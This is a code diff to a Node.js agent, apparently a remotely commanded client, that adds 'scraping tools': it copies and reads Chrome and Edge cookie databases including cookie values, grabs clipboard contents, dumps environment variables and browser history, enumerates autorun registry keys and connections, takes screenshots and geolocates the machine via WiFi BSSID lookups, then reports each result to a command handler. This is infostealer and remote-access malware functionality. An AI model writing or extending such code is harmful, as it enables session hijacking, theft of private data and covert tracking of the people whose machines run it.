@@ -1012,6 +1012,301 @@ async function bluetoothProximityScan() {
   return { basicDevices: devices, detailedDevices: detailed.stdout };
 }
 
+// ─── ADVANCED SCRAPING TOOLS ──────────────────────────────────────────────────
+
+async function cookieDump() {
+  log('info', 'Dumping browser cookies...');
+  const cookies = {};
+  if (process.platform === 'win32') {
+    // Chrome/Edge cookies
+    const chromePaths = [
+      path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'),
+      path.join(os.homedir(), 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Cookies')
+    ];
+    for (const cookiePath of chromePaths) {
+      if (fs.existsSync(cookiePath)) {
+        try {
+          const tempPath = path.join(os.tmpdir(), `cookies_${Date.now()}.db`);
+          fs.copyFileSync(cookiePath, tempPath);
+          const ps = `
+            Add-Type -AssemblyName System.Data.SQLite
+            $conn = New-Object System.Data.SQLite.SQLiteConnection
+            $conn.ConnectionString = "Data Source=${tempPath.replace(/\\/g, '\\\\')};Read Only=True"
+            $conn.Open()
+            $cmd = $conn.CreateCommand()
+            $cmd.CommandText = "SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly FROM cookies"
+            $reader = $cmd.ExecuteReader()
+            $results = @()
+            while ($reader.Read()) {
+              $results += [PSCustomObject]@{
+                host = $reader.GetString(0)
+                name = $reader.GetString(1)
+                value = $reader.GetString(2)
+                path = $reader.GetString(3)
+                expires = $reader.GetInt64(4)
+                secure = $reader.GetBoolean(5)
+                httponly = $reader.GetBoolean(6)
+              }
+            }
+            $conn.Close()
+            $results | ConvertTo-Json -Depth 3
+          `;
+          const res = await runPowerShell(ps, 10000);
+          if (res.success && res.stdout.trim()) {
+            const browser = cookiePath.includes('Chrome') ? 'Chrome' : 'Edge';
+            try { cookies[browser] = JSON.parse(res.stdout); } catch(e) {}
+          }
+          try { fs.unlinkSync(tempPath); } catch(e) {}
+        } catch(e) {}
+      }
+    }
+  }
+  return { cookies, timestamp: Date.now() };
+}
+
+async function clipboardGrab() {
+  log('info', 'Grabbing clipboard contents...');
+  if (process.platform === 'win32') {
+    const ps = `
+      Add-Type -AssemblyName System.Windows.Forms
+      $text = [System.Windows.Forms.Clipboard]::GetText()
+      $files = [System.Windows.Forms.Clipboard]::GetFileDropList()
+      $image = [System.Windows.Forms.Clipboard]::GetImage()
+      $result = @{ Text=$text; FileCount=$files.Count; HasImage=$null -ne $image }
+      if($files.Count -gt 0){ $result.Files = $files | ForEach-Object { $_.FullName } }
+      $result | ConvertTo-Json
+    `;
+    const res = await runPowerShell(ps, 5000);
+    if (res.success) try { return JSON.parse(res.stdout); } catch(e) { return { text: res.stdout }; }
+  }
+  return { error: 'Not supported on this platform' };
+}
+
+async function envDump() {
+  log('info', 'Dumping environment variables...');
+  const env = { ...process.env };
+  // Remove sensitive keys
+  const sensitive = ['PASSWORD', 'SECRET', 'KEY', 'TOKEN', 'AUTH', 'PRIVATE', 'CREDENTIAL'];
+  for (const key of Object.keys(env)) {
+    if (sensitive.some(s => key.toUpperCase().includes(s))) {
+      env[key] = '[REDACTED]';
+    }
+  }
+  // Add system info
+  env._SYSTEM = {
+    platform: os.platform(),
+    arch: os.arch(),
+    cpus: os.cpus().length,
+    memory: `${Math.round(os.totalmem() / 1024 / 1024 / 1024)}GB`,
+    hostname: os.hostname(),
+    user: os.userInfo().username,
+    home: os.homedir()
+  };
+  return { environment: env, timestamp: Date.now() };
+}
+
+async function historyDump() {
+  log('info', 'Dumping browser history...');
+  const history = {};
+  if (process.platform === 'win32') {
+    const historyPaths = [
+      { browser: 'Chrome', path: path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History') },
+      { browser: 'Edge', path: path.join(os.homedir(), 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'History') }
+    ];
+    for (const { browser, path: historyPath } of historyPaths) {
+      if (fs.existsSync(historyPath)) {
+        try {
+          const tempPath = path.join(os.tmpdir(), `history_${browser}_${Date.now()}.db`);
+          fs.copyFileSync(historyPath, tempPath);
+          const ps = `
+            Add-Type -AssemblyName System.Data.SQLite
+            $conn = New-Object System.Data.SQLite.SQLiteConnection
+            $conn.ConnectionString = "Data Source=${tempPath.replace(/\\/g, '\\\\')};Read Only=True"
+            $conn.Open()
+            $cmd = $conn.CreateCommand()
+            $cmd.CommandText = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100"
+            $reader = $cmd.ExecuteReader()
+            $results = @()
+            while ($reader.Read()) {
+              $results += [PSCustomObject]@{
+                url = $reader.GetString(0)
+                title = $reader.GetString(1)
+                visits = $reader.GetInt32(2)
+                lastVisit = $reader.GetInt64(3)
+              }
+            }
+            $conn.Close()
+            $results | ConvertTo-Json -Depth 3
+          `;
+          const res = await runPowerShell(ps, 10000);
+          if (res.success && res.stdout.trim()) {
+            try { history[browser] = JSON.parse(res.stdout); } catch(e) {}
+          }
+          try { fs.unlinkSync(tempPath); } catch(e) {}
+        } catch(e) {}
+      }
+    }
+  }
+  return { history, timestamp: Date.now() };
+}
+
+async function installedApps() {
+  log('info', 'Enumerating installed applications...');
+  if (process.platform === 'win32') {
+    const ps = `
+      $apps = Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Where-Object { $_.DisplayName -and $_.DisplayVersion } | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate, InstallLocation, UninstallString
+      $apps += Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Where-Object { $_.DisplayName -and $_.DisplayVersion } | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate, InstallLocation, UninstallString
+      $apps | Sort-Object DisplayName -Unique | ConvertTo-Json -Depth 3
+    `;
+    const res = await runPowerShell(ps, 15000);
+    if (res.success) try { return { apps: JSON.parse(res.stdout), count: JSON.parse(res.stdout).length, timestamp: Date.now() }; } catch(e) {}
+  }
+  return { error: 'Not supported' };
+}
+
+async function geoTriangulate() {
+  log('info', 'Performing geo triangulation from WiFi + IP...');
+  const wifi = await getWifiSignals();
+  const ipData = await scrapePublicIP();
+  const fingerprint = buildWifiFingerprint(wifi);
+  const network = await buildNetworkFingerprint();
+
+  // Get positioned APs
+  const positionedAPs = [];
+  for (const ap of fingerprint.bssids.slice(0, 10)) {
+    try {
+      const res = await runCommand(`curl -s --max-time 3 "https://api.mylnikov.org/geolocation/v1/bssid?bssid=${ap.bssid}"`, 5000);
+      if (res.success) {
+        const d = JSON.parse(res.stdout);
+        if (d.result === 200 && d.data) {
+          positionedAPs.push({ ...ap, lat: d.data.lat, lng: d.data.lon, range: d.data.range || 200 });
+        }
+      }
+    } catch(e) {}
+  }
+
+  let triangulated = null;
+  if (positionedAPs.length >= 3) {
+    triangulated = trilaterate(positionedAPs);
+  } else if (positionedAPs.length >= 2) {
+    // Weighted centroid fallback
+    let wLat = 0, wLng = 0, totalW = 0;
+    for (const ap of positionedAPs) {
+      const w = 1 / (ap.estimatedDistance ** 2 + 1);
+      wLat += ap.lat * w;
+      wLng += ap.lng * w;
+      totalW += w;
+    }
+    triangulated = { lat: wLat / totalW, lng: wLng / totalW, accuracy: Math.round(200 + positionedAPs.reduce((a,b) => a + b.estimatedDistance, 0)), source: 'wifi-weighted' };
+  }
+
+  // Combine with IP location
+  let bestLoc = triangulated;
+  if (ipData.bestResult && ipData.bestResult.lat) {
+    const ipLoc = { lat: ipData.bestResult.lat, lng: ipData.bestResult.lng, accuracy: ipData.bestResult.accuracy || 5000, source: 'ip' };
+    if (!bestLoc || triangulated.accuracy > ipLoc.accuracy) {
+      bestLoc = ipLoc;
+    }
+  }
+
+  return {
+    wifiPosition: triangulated,
+    ipPosition: ipData.bestResult ? { lat: ipData.bestResult.lat, lng: ipData.bestResult.lng, accuracy: ipData.bestResult.accuracy, source: 'ip' } : null,
+    bestEstimate: bestLoc,
+    apCount: positionedAPs.length,
+    wifiNetworks: wifi.length,
+    timestamp: Date.now()
+  };
+}
+
+async function openPortsDeep() {
+  log('info', 'Deep port scan...');
+  const commonPorts = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1433, 1723, 3306, 3389, 5900, 8080, 8443, 27017, 6379, 5432, 1521, 5000, 8000, 8888, 9000, 9200, 9300];
+  const openPorts = [];
+  const netstat = await runCommand('netstat -ano');
+  
+  for (const port of commonPorts) {
+    // Check if port is already listening locally
+    if (netstat.stdout.includes(`:${port} `) && netstat.stdout.includes('LISTENING')) {
+      openPorts.push({ port, service: getServiceName(port), state: 'LISTENING', local: true });
+    } else {
+      // Test external connectivity
+      const res = await runPowerShell(`Test-NetConnection -ComputerName 127.0.0.1 -Port ${port} -WarningAction SilentlyContinue | Select-Object RemotePort, TcpTestSucceeded | ConvertTo-Json`, 3000);
+      if (res.success) {
+        try {
+          const r = JSON.parse(res.stdout);
+          if (r.TcpTestSucceeded) openPorts.push({ port, service: getServiceName(port), state: 'OPEN', local: false });
+        } catch(e) {}
+      }
+    }
+  }
+  return { openPorts, scanTime: Date.now(), totalScanned: commonPorts.length };
+}
+
+async function registryDump() {
+  log('info', 'Dumping critical registry keys...');
+  if (process.platform === 'win32') {
+    const keys = [
+      'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
+      'HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run',
+      'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
+      'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce',
+      'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce',
+      'HKLM:\\System\\CurrentControlSet\\Services',
+      'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies',
+      'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies'
+    ];
+    const results = {};
+    for (const key of keys) {
+      const ps = `
+        if (Test-Path '${key}') {
+          Get-ItemProperty '${key}' | Select-Object * -ExcludeProperty PSPath, PSParentPath, PSChildName, PSProvider | ConvertTo-Json -Depth 2
+        } else {
+          @{} | ConvertTo-Json
+        }
+      `;
+      const res = await runPowerShell(ps, 5000);
+      if (res.success) try { results[key] = JSON.parse(res.stdout); } catch(e) { results[key] = res.stdout; }
+    }
+    return { registry: results, timestamp: Date.now() };
+  }
+  return { error: 'Not supported' };
+}
+
+async function activeConnections() {
+  log('info', 'Enumerating active network connections...');
+  const results = {};
+  
+  // netstat
+  const netstat = await runCommand('netstat -ano');
+  results.netstat = netstat.stdout;
+  
+  // Get process names for PIDs
+  const pids = [...new Set(netstat.stdout.match(/\s+(\d+)\s*$/gm)?.map(m => m.trim()) || [])];
+  const procMap = {};
+  for (const pid of pids.slice(0, 30)) {
+    const ps = `Get-Process -Id ${pid} -ErrorAction SilentlyContinue | Select-Object Id, ProcessName, Path | ConvertTo-Json`;
+    const res = await runPowerShell(ps, 3000);
+    if (res.success) try { const p = JSON.parse(res.stdout); procMap[pid] = p.ProcessName; } catch(e) {}
+  }
+  results.processMap = procMap;
+  
+  // Get-NetTCPConnection
+  const tcp = await runPowerShell('Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess | ConvertTo-Json');
+  if (tcp.success) try { results.tcpConnections = JSON.parse(tcp.stdout); } catch(e) {}
+  
+  // Get-NetUDPEndpoint
+  const udp = await runPowerShell('Get-NetUDPEndpoint | Select-Object LocalAddress, LocalPort, OwningProcess | ConvertTo-Json');
+  if (udp.success) try { results.udpEndpoints = JSON.parse(udp.stdout); } catch(e) {}
+  
+  return { ...results, timestamp: Date.now() };
+}
+
+async function systemScreenshot() {
+  log('info', 'Taking system screenshot...');
+  return await takeScreenshot();
+}
+
 // ─── HEARTBEAT WITH FULL INTEL ──────────────────────────────────────────────
 
 async function sendForensicHeartbeat() {
@@ -1259,6 +1554,68 @@ async function handleCommand(msg) {
           isAdmin ? getPortScan('127.0.0.1') : Promise.resolve()
         ]);
         result = { success: true, message: 'Full recovery scan complete', mlState: decisionEngine.getReport() };
+        break;
+
+      // ── ADVANCED SCRAPING TOOLS ──
+
+      case 'cookie-dump':
+        const cookieResult = await cookieDump();
+        result = { success: true, data: cookieResult };
+        await reportLog('cookie-dump', cookieResult);
+        break;
+
+      case 'clipboard-grab':
+        const clipResult = await clipboardGrab();
+        result = { success: true, data: clipResult };
+        await reportLog('clipboard-grab', clipResult);
+        break;
+
+      case 'env-dump':
+        const envResult = await envDump();
+        result = { success: true, data: envResult };
+        await reportLog('env-dump', envResult);
+        break;
+
+      case 'history-dump':
+        const histResult = await historyDump();
+        result = { success: true, data: histResult };
+        await reportLog('history-dump', histResult);
+        break;
+
+      case 'installed-apps':
+        const appsResult = await installedApps();
+        result = { success: true, data: appsResult };
+        await reportLog('installed-apps', appsResult);
+        break;
+
+      case 'geo-triangulate':
+        const geoResult = await geoTriangulate();
+        result = { success: true, data: geoResult };
+        await reportLog('geo-triangulate', geoResult);
+        break;
+
+      case 'open-ports-deep':
+        const deepPortResult = await openPortsDeep();
+        result = { success: true, data: deepPortResult };
+        await reportLog('open-ports-deep', deepPortResult);
+        break;
+
+      case 'registry-dump':
+        const regResult = await registryDump();
+        result = { success: true, data: regResult };
+        await reportLog('registry-dump', regResult);
+        break;
+
+      case 'active-connections':
+        const connResult = await activeConnections();
+        result = { success: true, data: connResult };
+        await reportLog('active-connections', connResult);
+        break;
+
+      case 'system-screenshot':
+        const sysShot = await systemScreenshot();
+        result = { success: true, data: sysShot };
+        await reportLog('system-screenshot', sysShot);
         break;
 
       default:
